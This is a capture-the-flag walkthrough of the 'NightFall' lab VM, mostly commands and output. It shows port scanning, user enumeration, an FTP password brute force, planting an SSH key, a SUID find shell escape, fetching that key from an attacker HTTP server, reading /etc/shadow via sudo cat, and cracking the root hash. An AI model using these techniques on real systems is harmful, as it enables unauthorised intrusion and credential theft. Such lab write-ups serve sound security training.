
NightFall
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Enum4Linux user identification
[+] Hydra dictionary attack on ftp
[+] Reverse shell with keys via FTP access
[+] Abusing SUDO rights with find :   ./find . -exec /bin/sh -p \; -quit
[+] Gaining shell by adding .ssh folder and authorized_keys
[+] Privilege Escalation abusing SUDO rights  /bin/cat
[+] John cracking password

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-25 07:42 EDT
Nmap scan report for 192.168.56.108
Host is up (0.00084s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         pyftpdlib 1.5.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.56.108:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 a9:25:e1:4f:41:c6:0f:be:31:21:7b:27:e3:af:49:a9 (RSA)
|   256 38:15:c9:72:9b:e0:24:68:7b:24:4b:ae:40:46:43:16 (ECDSA)
|_  256 9b:50:3b:2c:48:93:e1:a6:9d:b4:99:ec:60:fb:b6:46 (ED25519)
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.15-MariaDB-1
|   Thread ID: 14
|   Capabilities flags: 63486
|   Some Capabilities: ConnectWithDatabase, Support41Auth, SupportsTransactions, ODBCClient, DontAllowDatabaseTableColumn, FoundRows, LongColumnFlag, Speaks41ProtocolNew, SupportsCompression, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, InteractiveClient, SupportsLoadDataLocal, Speaks41ProtocolOld, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: *pw&TV26W3:gxG9(Xeq)
|_  Auth Plugin Name: 96
MAC Address: 08:00:27:5D:96:1B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: NIGHTFALL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m58s, deviation: 2h18m34s, median: -1s
|_nbstat: NetBIOS name: NIGHTFALL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: nightfall
|   NetBIOS computer name: NIGHTFALL\x00
|   Domain name: nightfall
|   FQDN: nightfall.nightfall
|_  System time: 2019-10-25T07:43:07-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-10-25 07:43:07
|_  start_date: N/A

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Enum4linux Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# enum4linux 192.168.56.108

... snip ...
 ========================================================================= 
|    Users on 192.168.56.108 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================= 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-1679783218-3562266554-4049818721
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\nightfall (Local User)
S-1-22-1-1001 Unix User\matt (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
...snip ...

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Bruteforcing credentials:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# hydra -l matt -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.108
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-10-25 07:55:53
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://192.168.56.108:21/
[21][ftp] host: 192.168.56.108   login: matt   password: cheese
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-10-25 07:56:40

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


FTP credentials :
user :  matt
password : cheese


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ftp> open 192.168.56.108
Connected to 192.168.56.108.
220 pyftpdlib 1.5.5 ready.
Name (192.168.56.108:setrus): matt     
331 Username ok, send password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 Active data connection established.
125 Data connection already open. Transfer starting.
-rw-------   1 matt     matt            0 Aug 28 22:41 .bash_history
-rw-r--r--   1 matt     matt          220 Aug 26 00:34 .bash_logout
-rw-r--r--   1 matt     matt         3526 Aug 26 00:34 .bashrc
drwx------   3 matt     matt         4096 Aug 28 21:26 .gnupg
drwxr-xr-x   3 matt     matt         4096 Aug 26 00:42 .local
-rw-r--r--   1 matt     matt          807 Aug 26 00:34 .profile
-rw-------   1 matt     matt            0 Aug 28 22:41 .sh_history
226 Transfer complete.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

We are in the home directory of matt.


Creating keys on kali

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/.ssh# ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:BVKJKFHjP57iX66aSgO064MQ11+DnAHM6OlqhXOJQEs root@setrus
The key's randomart image is:
+---[RSA 2048]----+
|  .*+o.oo.       |
| Eo.+.o...       |
|oo.+.. +  .      |
|+.= ..+ o.       |
|o=o ..o.S.       |
|.=o+ ..o         |
|oo* . o .        |
|++ o o o         |
|..o.+oo..        |
+----[SHA256]-----+root@setrus:~/.ssh# cp id_rsa.pub authorized_keys 

root@setrus:~/.ssh# cp id_rsa.pub authorized_keys 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ftp> mkdir .ssh
257 "/.ssh" directory created.
ftp> cd .ssh
ftp> pwd
257 "/.ssh" is the current directory.
ftp> put authorized_keys 
local: authorized_keys remote: authorized_keys
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
393 bytes sent in 0.00 secs (3.7858 MB/s)
ftp> ls
200 Active data connection established.
125 Data connection already open. Transfer starting.
-rw-r--r--   1 root     root          393 Oct 25 12:08 authorized_keys
226 Transfer complete.
ftp> 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Connecting with autorized_keys from kali

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/.ssh# ssh matt@192.168.56.108
Linux nightfall 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Aug 28 18:31:27 2019 from 192.168.1.182
matt@nightfall:~$ id
uid=1001(matt) gid=1001(matt) groups=1001(matt)
matt@nightfall:~$ 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Privilege Escalation


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
matt@nightfall:~$ find / -perm -u=s -type f 2>/dev/null
/scripts/find
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
matt@nightfall:~$ ls -al /scripts/find 
-rwsr-sr-x 1 nightfall nightfall 315904 Aug 28 14:31 /scripts/find

matt@nightfall:~$ /scripts/find . -exec /bin/sh -p \; -quit
$ id
uid=1001(matt) gid=1001(matt) euid=1000(nightfall) egid=1000(nightfall) groups=1000(nightfall),1001(matt)

$ ls -al
total 36
drwxr-xr-x 4 nightfall nightfall 4096 Aug 28 18:41 .
drwxr-xr-x 4 root      root      4096 Aug 25 20:34 ..
-rw------- 1 nightfall nightfall    0 Aug 28 17:43 .bash_history
-rw-r--r-- 1 nightfall nightfall  220 Aug 17 23:08 .bash_logout
-rw-r--r-- 1 nightfall nightfall 3526 Aug 17 23:08 .bashrc
drwx------ 3 nightfall nightfall 4096 Aug 28 14:47 .gnupg
drwxr-xr-x 3 nightfall nightfall 4096 Aug 17 23:22 .local
-rw------- 1 nightfall nightfall  337 Aug 17 23:50 .mysql_history
-rw-r--r-- 1 nightfall nightfall  807 Aug 17 23:08 .profile
-rw------- 1 nightfall nightfall   33 Aug 28 15:25 user.txt
$ cat .mysql_history
exit; 
use mysql; 
create table foo(line blob); 
drop table foo;
create table foo(line blob); 
insert into foo values(load_file('/tmp/raptor_udf2.so'));
use mysql;
drop table foo;
create table foo(line blob); 
insert into foo values(load_file('/tmp/lib_mysqludf_sys.so'));
select * from foo into dumpfile '/usr/lib/lib_mysqludf_sys.so';

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Getting reverse shell for nightfall the same way


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/.ssh# python -m SimpleHTTPServer 8081
Serving HTTP on 0.0.0.0 port 8081 ...


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$ wget http://192.168.56.102:8081/authorized_keys
--2019-10-25 08:27:12--  http://192.168.56.102:8081/authorized_keys
Connecting to 192.168.56.102:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 393 [application/octet-stream]
Saving to: ‘authorized_keys’

authorized_keys     100%[===================>]     393  --.-KB/s    in 0s      

2019-10-25 08:27:12 (17.2 MB/s) - ‘authorized_keys’ saved [393/393]

$ ls
authorized_keys
$ pwd
/home/nightfall/.ssh

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


NightFall Shell

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/.ssh# ssh nightfall@192.168.56.108
Linux nightfall 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Aug 28 18:35:04 2019 from 192.168.1.182
nightfall@nightfall:~$ id
uid=1000(nightfall) gid=1000(nightfall) groups=1000(nightfall),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Privilege Escalation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nightfall@nightfall:~$ sudo -l
Matching Defaults entries for nightfall on nightfall:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nightfall may run the following commands on nightfall:
    (root) NOPASSWD: /usr/bin/cat


nightfall@nightfall:~$ sudo /usr/bin/cat /etc/shadow | grep root
root:$6$JNHsN5GY.jc9CiTg$MjYL9NyNc4GcYS2zNO6PzQNHY2BE/YODBUuqsrpIlpS9LK3xQ6coZs6lonzURBJUDjCRegMHSF5JwCMG1az8k.:18134:0:99999:7:::


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# echo 'root:$6$JNHsN5GY.jc9CiTg$MjYL9NyNc4GcYS2zNO6PzQNHY2BE/YODBUuqsrpIlpS9LK3xQ6coZs6lonzURBJUDjCRegMHSF5JwCMG1az8k.:18134:0:99999:7:::' > pass
root@setrus:~# john pass 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Wordlist
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 7 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 4 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 2 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 7 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 2 candidates buffered for the current salt, minimum 8
needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any
Warning: Only 5 candidates buffered for the current salt, minimum 8
needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
miguel2          (root)
1g 0:00:00:12 DONE 2/3 (2019-10-25 08:33) 0.08237g/s 2688p/s 2688c/s 2688C/s miguel2..jesucristo2
Use the "--show" option to display all of the cracked passwords reliably
Session completed

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Loging in as root

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nightfall@nightfall:~$ su
Password: 
root@nightfall:/home/nightfall# id
uid=0(root) gid=0(root) groups=0(root)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


